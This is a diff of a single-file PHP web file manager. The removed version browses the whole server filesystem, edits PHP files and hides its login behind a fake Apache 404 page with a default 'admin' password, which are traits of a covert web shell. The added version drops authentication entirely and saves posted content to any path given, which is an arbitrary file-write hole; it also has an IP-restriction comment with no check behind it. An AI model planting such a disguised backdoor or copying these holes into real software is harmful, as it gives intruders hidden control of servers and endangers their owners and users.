@@ -1,603 +1,365 @@
 <?php
-/**
- * Minimal PHP File Manager / Editor (SHA-512 password, optional hidden login)
- * - Single file
- * - Browse directories under BASE_DIR (can be / for full filesystem, or webroot, etc.)
- * - View & edit text files (php, html, js, css, txt, etc.)
- * - Rename files and directories
- * - Password stored as SHA-512 hash (Pheditor-style)
- * - Login disguised as Apache 404 page
- */
-
-declare(strict_types=1);
-
-// Base directory for browsing. Change this if you want another root.
-// Example for full filesystem (if PHP has permissions):
-// define('BASE_DIR', '/');
-// Directorio inicial se toma automáticamente desde el directorio de trabajo actual (pwd)
-define('START_DIR', realpath(getcwd()));
-// BASE_DIR se usa como raíz lógica (aquí el filesystem raíz '/')
-define('BASE_DIR', DIRECTORY_SEPARATOR);
-
-// SHA-512 hash of the password. Default is hash of 'admin'.
-// To change: compute hash('sha512', 'tu_password') y reemplaza el valor.
-define('PASSWORD', 'c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec');
-
-// Toggle login requirement. If set to false, no login is required.
-define('ENABLE_LOGIN', true);
-
-define('TITLE', 'File Manager');
-define('ALLOWED_EXT', '/\.(php|phps|phtml|html?|css|js|txt|md|xml|json|log|ini|conf)$/i');
-
-session_name('fm_sess');
 session_start();
+//make your to add your ip address
 
-function fm_render_404_login(?string $error = null): void
-{
-    http_response_code(404);
-    $reqUri = htmlspecialchars($_SERVER['REQUEST_URI'] ?? '', ENT_QUOTES, 'UTF-8');
-    $host   = htmlspecialchars($_SERVER['HTTP_HOST'] ?? 'localhost', ENT_QUOTES, 'UTF-8');
-    $port   = (int)($_SERVER['SERVER_PORT'] ?? 80);
-    ?>
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="utf-8">
-    <title>404 Not Found</title>
-    <style>
-        body {
-            font-family: Arial, Helvetica, sans-serif;
-            background-color: #ffffff;
-            color: #000000;
-            margin: 20px;
-        }
-        h1 { font-size: 22px; margin-bottom: 10px; }
-        p  { margin: 5px 0; }
-        form { margin-top: 15px; }
-        input[type=password] {
-            padding: 4px 6px;
-            font-size: 13px;
-            border: 1px solid #ccc;
-        }
-        input[type=submit] {
-            padding: 4px 10px;
-            font-size: 13px;
-            margin-left: 5px;
-        }
-        .error {
-            color: #c00;
-            margin-top: 5px;
-        }
-        hr {
-            margin-top: 20px;
-            border: 0;
-            border-top: 1px solid #ccc;
-        }
-        address {
-            font-style: normal;
-            font-size: 12px;
-            color: #555;
-        }
-    </style>
-</head>
-<body>
-    <h1>Not Found</h1>
-    <?php if ($error): ?>
-        <p class="error"><?php echo htmlspecialchars($error, ENT_QUOTES, 'UTF-8'); ?></p>
-    <?php else: ?>
-        <p>The requested URL <?php echo $reqUri; ?> was not found on this server.</p>
-    <?php endif; ?>
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
 
-    <form method="post">
-        <label for="password">Password:</label>
-        <input id="password" name="password" type="password" autocomplete="off">
-        <input type="submit" value="OK">
-        <input type="hidden" name="__login" value="1">
-    </form>
+// **Function to List Files & Directories (Recursive)**
+function listFilesAndDirectories($dir, $baseDir = '') {
+    $items = glob($dir . '/*');
 
-    <hr>
-    <address>
-        Apache/2.4.41 (Unix) Server at <?php echo $host; ?> Port <?php echo $port; ?>
-    </address>
-    <script>document.getElementById('password').focus();</script>
-</body>
-</html>
-<?php
+    $directories = [];
+    $files = [];
+
+    foreach ($items as $item) {
+        if (is_dir($item)) {
+            $directories[] = $item;
+        } else {
+            $files[] = $item;
+        }
+    }
+
+    natcasesort($directories);
+    natcasesort($files);
+    $sortedItems = array_merge($directories, $files);
+    $output = '';
+
+    foreach ($sortedItems as $item) {
+        $relativePath = ltrim(str_replace($baseDir, '', $item), '/');
+        $name = basename($item);
+
+        if (is_dir($item)) {
+            $subItems = listFilesAndDirectories($item, $baseDir);
+            $collapseId = 'collapse-' . md5($relativePath);
+            $output .= '<li class="nav-item">';
+            $output .= '<a class="nav-link dropdown-toggle" href="#" data-bs-toggle="collapse" data-bs-target="#' . $collapseId . '">';
+            $output .= '<span class="nav-link-title">' . $name . '</span>';
+            $output .= '</a>';
+            $output .= '<ul class="collapse list-unstyled ms-3" id="' . $collapseId . '">' . $subItems . '</ul>';
+            $output .= '</li>';
+        } else {
+            $output .= '<li class="nav-item">';
+            $output .= '<a class="nav-link file-link" href="?file=' . $relativePath . '" data-path="?file=' . $relativePath . '">';
+            $output .= '<span class="nav-link-title">' . $name . '</span>';
+            $output .= '</a>';
+            $output .= '</li>';
+        }
+    }
+
+    return $output;
+}
+
+// Root directory
+$directory = '.';
+$menu = listFilesAndDirectories($directory, realpath($directory));
+
+if (!isset($_SESSION['csrf_token'])) {
+    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+    $_SESSION['csrf_cookie'] = md5($_SESSION['csrf_token']);
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === "save") {
+    // CSRF Token validation
+    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
+        die('Invalid CSRF token.');
+    }
+
+    $requestedFilename = basename($_POST['file']);
+    $scriptFilename = basename(__FILE__);
+
+    // Prevent editing of this script
+    if ($requestedFilename === $scriptFilename) {
+        die('Editing this script file is not allowed.');
+    }
+
+    $filePath = realpath($_POST['file']);
+    $filename = $filePath;
+    $fileContent = $_POST['myTextArea'];
+
+    // Save file content
+    file_put_contents($filename, $fileContent);
     exit;
 }
 
-if (ENABLE_LOGIN && !empty(PASSWORD) && empty($_SESSION['fm_auth'])) {
-    if (($_SERVER['REQUEST_METHOD'] ?? 'GET') === 'POST' && isset($_POST['__login'])) {
-        $pass = $_POST['password'] ?? '';
-        $hash = hash('sha512', $pass);
-        if (hash_equals(PASSWORD, $hash)) {
-            $_SESSION['fm_auth'] = true;
-        } else {
-            fm_render_404_login('Incorrect password.');
-        }
+if (isset($_GET['file'])) {
+    $filePath = realpath($directory . '/' . $_GET['file']);
+
+    // Validate file path
+    if (strpos($filePath, realpath($directory)) === 0 && file_exists($filePath)) {
+        $fileContent = file_get_contents($filePath);
+        $fileName = basename($filePath);
     } else {
-        fm_render_404_login(null);
+        die('File not found or access denied.');
     }
-}
-
-function fm_sanitize_rel_path(string $rel): string
-{
-    $rel = str_replace(["\0", "\r", "\n"], '', $rel);
-    $rel = trim($rel);
-    if ($rel === '' || $rel === '/') {
-        return '/';
-    }
-    $rel = str_replace('\\', '/', $rel);
-    $rel = '/' . trim($rel, '/');
-    $parts = [];
-    foreach (explode('/', $rel) as $p) {
-        if ($p === '' || $p === '.') continue;
-        if ($p === '..') {
-            array_pop($parts);
-        } else {
-            $parts[] = $p;
-        }
-    }
-    return '/' . implode('/', $parts);
-}
-
-function fm_full_path(string $rel): string
-{
-    $rel = fm_sanitize_rel_path($rel);
-    $base = BASE_DIR;
-    $target = $base . ($rel === '/' ? '' : DIRECTORY_SEPARATOR . str_replace('/', DIRECTORY_SEPARATOR, ltrim($rel, '/')));
-    $real = realpath($target);
-    if ($real === false) {
-        return $base;
-    }
-    // evitar escapar BASE_DIR
-    if (strpos($real, $base) !== 0) {
-        return $base;
-    }
-    return $real;
-}
-
-function fm_is_text_file(string $path): bool
-{
-    if (!is_file($path)) return false;
-    if (!preg_match(ALLOWED_EXT, basename($path))) return false;
-    return true;
-}
-
-$currentRel = isset($_GET['path']) ? (string)$_GET['path'] : START_DIR;
-$currentRel = fm_sanitize_rel_path($currentRel);
-$currentDir = fm_full_path($currentRel);
-$currentFileRel = null;
-$currentFilePath = null;
-$message = '';
-
-if (isset($_GET['file']) && $_GET['file'] !== '') {
-    $fileRel = fm_sanitize_rel_path((string)$_GET['file']);
-    $filePath = fm_full_path($fileRel);
-    if (is_file($filePath) && fm_is_text_file($filePath)) {
-        $currentFileRel = $fileRel;
-        $currentFilePath = $filePath;
-        $currentDir = dirname($filePath);
-        $relFromBase = substr($currentDir, strlen(BASE_DIR));
-        $currentRel = $relFromBase === '' ? '/' : str_replace(DIRECTORY_SEPARATOR, '/', $relFromBase);
-        if ($currentRel[0] !== '/') $currentRel = '/' . $currentRel;
-    }
-}
-
-if (($_SERVER['REQUEST_METHOD'] ?? 'GET') === 'POST') {
-    $action = $_POST['action'] ?? '';
-    if ($action === 'save') {
-        $fileRel = isset($_POST['file']) ? fm_sanitize_rel_path((string)$_POST['file']) : null;
-        $data = $_POST['content'] ?? '';
-        if ($fileRel !== null) {
-            $filePath = fm_full_path($fileRel);
-            if (!fm_is_text_file($filePath)) {
-                $message = 'Cannot save: file type not allowed.';
-            } else {
-                if (@file_put_contents($filePath, $data) === false) {
-                    $message = 'Error saving file.';
-                } else {
-                    $message = 'File saved.';
-                    $currentFileRel = $fileRel;
-                    $currentFilePath = $filePath;
-                }
-            }
-        }
-    } elseif ($action === 'rename') {
-        $oldRel = isset($_POST['old']) ? fm_sanitize_rel_path((string)$_POST['old']) : null;
-        $newName = trim((string)($_POST['new_name'] ?? ''));
-        if ($oldRel !== null && $newName !== '') {
-            $oldPath = fm_full_path($oldRel);
-            $dir = dirname($oldPath);
-            $newPath = $dir . DIRECTORY_SEPARATOR . $newName;
-            if (!file_exists($oldPath)) {
-                $message = 'Item not found.';
-            } elseif (file_exists($newPath)) {
-                $message = 'Target name already exists.';
-            } elseif (!@rename($oldPath, $newPath)) {
-                $message = 'Rename failed.';
-            } else {
-                $message = 'Renamed successfully.';
-                $relFromBaseDir = substr($dir, strlen(BASE_DIR));
-                $currentRel = $relFromBaseDir === '' ? '/' : str_replace(DIRECTORY_SEPARATOR, '/', $relFromBaseDir);
-                if ($currentRel[0] !== '/') $currentRel = '/' . $currentRel;
-                if (is_file($newPath) && fm_is_text_file($newPath)) {
-                    $relNew = $currentRel === '/' ? '/' . $newName : $currentRel . '/' . $newName;
-                    $currentFileRel = $relNew;
-                    $currentFilePath = $newPath;
-                } else {
-                    $currentFileRel = null;
-                    $currentFilePath = null;
-                }
-            }
-        }
-    }
-    $currentDir = fm_full_path($currentRel);
-}
-
-$realBase = BASE_DIR;
-$realCurrent = $currentDir;
-
-$items = [];
-if (is_dir($currentDir)) {
-    $dh = opendir($currentDir);
-    if ($dh) {
-        while (($entry = readdir($dh)) !== false) {
-            if ($entry === '.' || $entry === '..') continue;
-            $full = $currentDir . DIRECTORY_SEPARATOR . $entry;
-            $isDir = is_dir($full);
-            $relFromBase = substr($full, strlen($realBase));
-            $rel = $relFromBase === '' ? '/' : str_replace(DIRECTORY_SEPARATOR, '/', $relFromBase);
-            if ($rel === '') $rel = '/';
-            if ($rel[0] !== '/') $rel = '/' . $rel;
-            $items[] = [
-                'name' => $entry,
-                'is_dir' => $isDir,
-                'rel' => $rel,
-            ];
-        }
-        closedir($dh);
-    }
-}
-
-usort($items, function(array $a, array $b): int {
-    if ($a['is_dir'] && !$b['is_dir']) return -1;
-    if (!$a['is_dir'] && $b['is_dir']) return 1;
-    return strcasecmp($a['name'], $b['name']);
-});
-
-$breadcrumbs = [];
-$parts = $currentRel === '/' ? [] : explode('/', trim($currentRel, '/'));
-$acc = '';
-$breadcrumbs[] = ['label' => '/', 'path' => '/'];
-foreach ($parts as $p) {
-    $acc .= '/' . $p;
-    $breadcrumbs[] = ['label' => $p, 'path' => $acc];
-}
-
-$parentRel = '/';
-if ($currentRel !== '/') {
-    $temp = explode('/', trim($currentRel, '/'));
-    array_pop($temp);
-    $parentRel = empty($temp) ? '/' : '/' . implode('/', $temp);
-}
-
-$currentFileContent = '';
-if ($currentFilePath !== null && is_file($currentFilePath)) {
-    $currentFileContent = @file_get_contents($currentFilePath);
-    if ($currentFileContent === false) {
-        $currentFileContent = '';
-        $message = $message ?: 'Cannot read file.';
-    }
-}
 ?>
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <meta charset="utf-8">
-    <title><?php echo htmlspecialchars(TITLE, ENT_QUOTES, 'UTF-8'); ?></title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.1/codemirror.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.1/theme/dracula.min.css">
     <style>
-        body {
-            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-            font-size: 14px;
+        html, body {
+            height: 100%;
             margin: 0;
             padding: 0;
-            background: #f5f5f5;
-            color: #222;
-        }
-        header {
-            background: #333;
-            color: #fff;
-            padding: 8px 12px;
-        }
-        header h1 {
-            margin: 0;
-            font-size: 16px;
-        }
-        .path {
-            font-size: 12px;
-            color: #ddd;
-        }
-        .container {
-            display: flex;
-            gap: 0;
-        }
-        .left {
-            width: 35%;
-            max-width: 420px;
-            background: #fff;
-            border-right: 1px solid #ccc;
-            height: calc(100vh - 48px);
-            overflow: auto;
-        }
-        .right {
-            flex: 1;
-            height: calc(100vh - 48px);
-            display: flex;
-            flex-direction: column;
-        }
-        .breadcrumb {
-            padding: 6px 10px;
-            background: #fafafa;
-            border-bottom: 1px solid #ddd;
-            font-size: 12px;
-        }
-        .breadcrumb a {
-            color: #06c;
-            text-decoration: none;
-        }
-        .breadcrumb a:hover {
-            text-decoration: underline;
-        }
-        .list {
-            list-style: none;
-            margin: 0;
-            padding: 0;
-        }
-        .list li {
-            display: flex;
-            align-items: center;
-            padding: 4px 10px;
-            border-bottom: 1px solid #f0f0f0;
-            font-size: 13px;
-        }
-        .list li:nth-child(odd) {
-            background: #fafafa;
-        }
-        .list li .name {
-            flex: 1;
             overflow: hidden;
-            text-overflow: ellipsis;
-            white-space: nowrap;
         }
-        .list li .name a {
-            color: #333;
-            text-decoration: none;
+        .CodeMirror {
+            height: 100vh !important;
+            width: 100vw !important;
         }
-        .list li .name a.dir {
-            font-weight: bold;
+        .context-menu {
+            position: absolute;
+            background: #222;
+            color: #fff;
+            border-radius: 4px;
+            padding: 5px 0;
+            display: none;
+            z-index: 1000;
+            border: 1px solid #444;
         }
-        .list li .name a:hover {
-            text-decoration: underline;
+        .context-menu ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
         }
-        .list li .actions a {
-            margin-left: 6px;
-            font-size: 11px;
-            color: #06c;
-            text-decoration: none;
-        }
-        .list li .actions a:hover {
-            text-decoration: underline;
-        }
-        .badge {
-            display: inline-block;
-            padding: 2px 5px;
-            font-size: 10px;
-            border-radius: 3px;
-            background: #eee;
-            margin-right: 6px;
-        }
-        .badge.dir { background: #d0ebff; }
-        .badge.file { background: #e7f5ff; }
-
-        .editor-header {
-            padding: 6px 10px;
-            background: #fafafa;
-            border-bottom: 1px solid #ddd;
-            font-size: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-        .editor-header .file-name {
-            font-weight: bold;
-        }
-        .editor-header .msg {
-            color: #090;
-            margin-left: 10px;
-        }
-        .editor {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-        }
-        .editor textarea {
-            flex: 1;
-            width: 100%;
-            border: none;
-            padding: 10px;
-            font-family: Consolas, Menlo, Monaco, monospace;
-            font-size: 13px;
-            box-sizing: border-box;
-            resize: none;
-            outline: none;
-        }
-        .editor-footer {
-            padding: 6px 10px;
-            border-top: 1px solid #ddd;
-            background: #fafafa;
-            text-align: right;
-        }
-        button {
-            padding: 4px 10px;
-            font-size: 13px;
-            border-radius: 3px;
-            border: 1px solid #999;
-            background: #eee;
+        .context-menu ul li {
+            padding: 8px 15px;
             cursor: pointer;
+            background: #222;
         }
-        button:hover {
-            background: #ddd;
-        }
-        .msg-error { color: #b00; }
-        .top-controls {
-            padding: 4px 10px;
-            font-size: 12px;
-            border-bottom: 1px solid #ddd;
-            background: #f8f8f8;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        .top-controls a {
-            text-decoration: none;
-            color: #06c;
-        }
-        .top-controls a:hover {
-            text-decoration: underline;
-        }
-        .no-file {
-            padding: 10px;
-            font-size: 13px;
-            color: #666;
-        }
-        @media (max-width: 900px) {
-            .container { flex-direction: column; }
-            .left {
-                width: 100%;
-                max-width: none;
-                height: auto;
-                max-height: 50vh;
-            }
-            .right {
-                height: auto;
-                max-height: 50vh;
-            }
+        .context-menu ul li:hover {
+            background: #555;
         }
     </style>
-    <script>
-        function renameItem(path) {
-            var base = path.split('/').pop();
-            var name = prompt('New name for: ' + base, base);
-            if (!name) return;
-            var f = document.getElementById('rename-form');
-            f.elements['old'].value = path;
-            f.elements['new_name'].value = name;
-            f.submit();
-        }
-    </script>
 </head>
 <body>
-<header>
-    <h1><?php echo htmlspecialchars(TITLE, ENT_QUOTES, 'UTF-8'); ?></h1>
-    <div class="path">
-        Base: <?php echo htmlspecialchars(START_DIR, ENT_QUOTES, 'UTF-8'); ?><br>
-        Current: <?php echo htmlspecialchars($realCurrent, ENT_QUOTES, 'UTF-8'); ?>
-    </div>
-</header>
-<div class="container">
-    <div class="left">
-        <div class="top-controls">
-            <strong>Directory</strong>
-            <?php if ($currentRel !== '/'): ?>
-                <a href="?path=<?php echo urlencode($parentRel); ?>">[Up]</a>
-            <?php else: ?>
-                <span style="color:#999;">[Up]</span>
-            <?php endif; ?>
-        </div>
-        <div class="breadcrumb">
-            <?php foreach ($breadcrumbs as $i => $bc): ?>
-                <?php if ($i > 0): ?> &raquo; <?php endif; ?>
-                <?php if ($i === count($breadcrumbs) - 1): ?>
-                    <strong><?php echo htmlspecialchars($bc['label'], ENT_QUOTES, 'UTF-8'); ?></strong>
-                <?php else: ?>
-                    <a href="?path=<?php echo urlencode($bc['path']); ?>">
-                        <?php echo htmlspecialchars($bc['label'], ENT_QUOTES, 'UTF-8'); ?>
-                    </a>
-                <?php endif; ?>
-            <?php endforeach; ?>
-        </div>
-        <ul class="list">
-            <?php if (empty($items)): ?>
-                <li><span class="name"><em>Empty directory</em></span></li>
-            <?php else: ?>
-                <?php foreach ($items as $it): ?>
-                    <li>
-                        <span class="badge <?php echo $it['is_dir'] ? 'dir' : 'file'; ?>">
-                            <?php echo $it['is_dir'] ? 'DIR' : 'FILE'; ?>
-                        </span>
-                        <span class="name">
-                            <?php if ($it['is_dir']): ?>
-                                <a class="dir" href="?path=<?php echo urlencode($it['rel']); ?>">
-                                    <?php echo htmlspecialchars($it['name'], ENT_QUOTES, 'UTF-8'); ?>
-                                </a>
-                            <?php else: ?>
-                                <a href="?file=<?php echo urlencode($it['rel']); ?>">
-                                    <?php echo htmlspecialchars($it['name'], ENT_QUOTES, 'UTF-8'); ?>
-                                </a>
-                            <?php endif; ?>
-                        </span>
-                        <span class="actions">
-                            <a href="#" onclick="renameItem('<?php echo htmlspecialchars($it['rel'], ENT_QUOTES, 'UTF-8'); ?>'); return false;">rename</a>
-                        </span>
-                    </li>
-                <?php endforeach; ?>
-            <?php endif; ?>
+    <form id="myForm" method="POST">
+        <input type="hidden" name="action" value="save">
+        <input type="hidden" name="file" value="<?php echo htmlspecialchars($filePath); ?>">
+        <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
+        <textarea id="editor" name="myTextArea"><?php echo htmlspecialchars($fileContent); ?></textarea>
+        <button type="submit" style="display:none;">Submit</button>
+    </form>
+
+    <div class="context-menu" id="contextMenu">
+        <ul>
+            <li onclick="copyText()">Copy</li>
+            <li onclick="pasteText()">Paste</li>
+            <li onclick="selectAllText()">Select All</li>
+            <li onclick="saveFile()">Save File</li>
         </ul>
     </div>
-    <div class="right">
-        <div class="editor-header">
-            <div>
-                <?php if ($currentFileRel): ?>
-                    <span class="file-name"><?php echo htmlspecialchars($currentFileRel, ENT_QUOTES, 'UTF-8'); ?></span>
-                <?php else: ?>
-                    <span class="file-name">No file selected</span>
-                <?php endif; ?>
-            </div>
-            <div>
-                <?php if ($message): ?>
-                    <span class="<?php echo (strpos($message, 'Error') !== false || strpos($message, 'Cannot') !== false || strpos($message, 'failed') !== false) ? 'msg-error' : 'msg'; ?>">
-                        <?php echo htmlspecialchars($message, ENT_QUOTES, 'UTF-8'); ?>
-                    </span>
-                <?php endif; ?>
-            </div>
-        </div>
-        <div class="editor">
-            <?php if ($currentFileRel && $currentFilePath): ?>
-                <form method="post" style="height:100%;display:flex;flex-direction:column;">
-                    <textarea name="content"><?php echo htmlspecialchars($currentFileContent, ENT_QUOTES, 'UTF-8'); ?></textarea>
-                    <div class="editor-footer">
-                        <input type="hidden" name="action" value="save">
-                        <input type="hidden" name="file" value="<?php echo htmlspecialchars($currentFileRel, ENT_QUOTES, 'UTF-8'); ?>">
-                        <button type="submit">Save</button>
-                    </div>
-                </form>
-            <?php else: ?>
-                <div class="no-file">
-                    Select a file from the left panel to view or edit its contents.
-                    <br>
-                    Only text-like files with extensions:
-                    <code>.php, .html, .htm, .css, .js, .txt, .md, .xml, .json, .log, .ini, .conf</code>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.1/codemirror.min.js"></script>
+    <script>
+        var editor = CodeMirror.fromTextArea(document.getElementById('editor'), {
+            lineNumbers: true,
+            mode: "javascript",
+            theme: "dracula"
+        });
+
+        var contextMenu = document.getElementById("contextMenu");
+
+        document.addEventListener("contextmenu", function(event) {
+            event.preventDefault();
+            if (event.target.closest(".CodeMirror")) {
+                contextMenu.style.display = "block";
+                contextMenu.style.left = event.pageX + "px";
+                contextMenu.style.top = event.pageY + "px";
+            }
+        });
+
+        document.addEventListener("click", function() {
+            contextMenu.style.display = "none";
+        });
+
+        function copyText() {
+            navigator.clipboard.writeText(editor.getSelection());
+            alert("Copied to clipboard");
+        }
+
+        function pasteText() {
+            navigator.clipboard.readText().then(text => {
+                editor.replaceSelection(text);
+            });
+        }
+
+        function selectAllText() {
+            editor.execCommand("selectAll");
+        }
+
+        function saveFile() {
+            
+                // Update the hidden textarea with the editor's content before submission
+                document.getElementById("editor").value = editor.getValue();
+
+                var formData = new FormData(document.getElementById("myForm"));
+
+                fetch("<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>", {
+                    method: "POST",
+                    body: formData
+                })
+                .then(response => response.text())
+                .then(data => {
+                    alert("File Saved!");
+                    console.log("Response:", data);
+                })
+                .catch(error => {
+                    alert("Failed to save the file! Check console for details.");
+                    console.error("Error:", error);
+                });
+            
+        }
+    </script>
+</body>
+</html>
+  
+<?php exit; } ?>
+
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Tabler File Browser</title>
+    <script src="https://cdn.jsdelivr.net/npm/@tabler/core@1.0.0/dist/js/tabler.min.js"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/core@1.0.0/dist/css/tabler.min.css">
+    <style>
+        .iframe-container { width: 100%; height: 100vh; border: none; }
+        .close-tab { cursor: pointer; margin-left: 8px; color: red; }
+    .context-menu {
+    position: absolute;
+    background: #222; /* Dark theme */
+    color: #fff;
+    border-radius: 4px;
+    padding: 5px 0;
+    display: none;
+    z-index: 1000; /* Ensure it's above other elements */
+    border: 1px solid #444;
+}
+
+.context-menu ul {
+    list-style: none;
+    padding: 0;
+    margin: 0;
+}
+
+.context-menu ul li {
+    padding: 8px 15px;
+    cursor: pointer;
+    background: #222;
+}
+
+.context-menu ul li:hover {
+    background: #555;
+}
+
+    </style>
+</head>
+<body>
+
+    <div class="page">
+        <aside class="navbar navbar-vertical navbar-expand-sm" data-bs-theme="dark">
+            <div class="container-fluid">
+                <button class="navbar-toggler" type="button">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+                <h1 class="navbar-brand navbar-brand-autodark">
+                    <a href="#">File Browser</a>
+                </h1>
+                <div class="collapse navbar-collapse">
+                    <ul class="navbar-nav pt-lg-3">
+                      <?php echo $menu; ?>
+                    </ul>
                 </div>
-            <?php endif; ?>
+                <div class="context-menu" id="contextMenu">
+        <ul>
+            <li onclick="copyText()">Copy</li>
+            <li onclick="pasteText()">Paste</li>
+            <li onclick="selectAllText()">Select All</li>
+            <li onclick="saveFile()">Save File</li>
+        </ul>
+    </div>
+            </div>
+        </aside>
+
+        <div class="page-wrapper">
+            <div class="navbar sticky-top">
+            <ul class="nav nav-tabs card-header-tabs" id="tabList">
+                <li class="nav-item">
+                    <a href="#tab-home" class="nav-link active" data-bs-toggle="tab">Home</a>
+                </li>
+            </ul>
+            </div>
+            <div class="tab-content" id="tabContent">
+                <div class="tab-pane active" id="tab-home">
+                    
+                   <iframe src="https://pwarcade.com/play/all/1" width="100%" height="600px"></iframe> 
+                    
+                    
+                  
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                </div>
+            </div>
         </div>
     </div>
-</div>
 
-<form id="rename-form" method="post" style="display:none;">
-    <input type="hidden" name="action" value="rename">
-    <input type="hidden" name="old" value="">
-    <input type="hidden" name="new_name" value="">
-</form>
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            document.querySelectorAll(".file-link").forEach(link => {
+                link.addEventListener("click", function(event) {
+                    event.preventDefault();
+                    const filePath = this.getAttribute("data-path");
+                    const fileName = this.querySelector('.nav-link-title').textContent.trim();
+                    addTab(filePath, fileName);
+                });
+            });
+        });
+
+        function addTab(filePath, fileName) {
+            let existingTab = document.getElementById(`tab-${fileName}`);
+
+            if (existingTab) {
+                new bootstrap.Tab(existingTab.querySelector("a")).show();
+                return;
+            }
+
+            let tabList = document.getElementById("tabList");
+            let tabContent = document.getElementById("tabContent");
+
+            let newTab = document.createElement("li");
+            newTab.className = "nav-item";
+            newTab.id = `tab-${fileName}`;
+            newTab.innerHTML = `<a href="#tab-${fileName}-pane" class="nav-link" data-bs-toggle="tab">${fileName} <span class="close-tab" onclick="removeTab('${fileName}')">×</span></a>`;
+            tabList.appendChild(newTab);
+
+            let newContent = document.createElement("div");
+            newContent.className = "tab-pane fade";
+            newContent.id = `tab-${fileName}-pane`;
+            newContent.innerHTML = `<iframe src="${filePath}" class="iframe-container" id=></iframe>`;
+            tabContent.appendChild(newContent);
+
+            new bootstrap.Tab(newTab.querySelector('a')).show();
+        }
+
+function removeTab(fileName) {
+    if (confirm(`Are you sure you want to close ${fileName}?`)) {
+        document.getElementById(`tab-${fileName}`).remove();
+        document.getElementById(`tab-${fileName}-pane`).remove();
+    }
+}
+    </script>
+
 </body>
 </html>
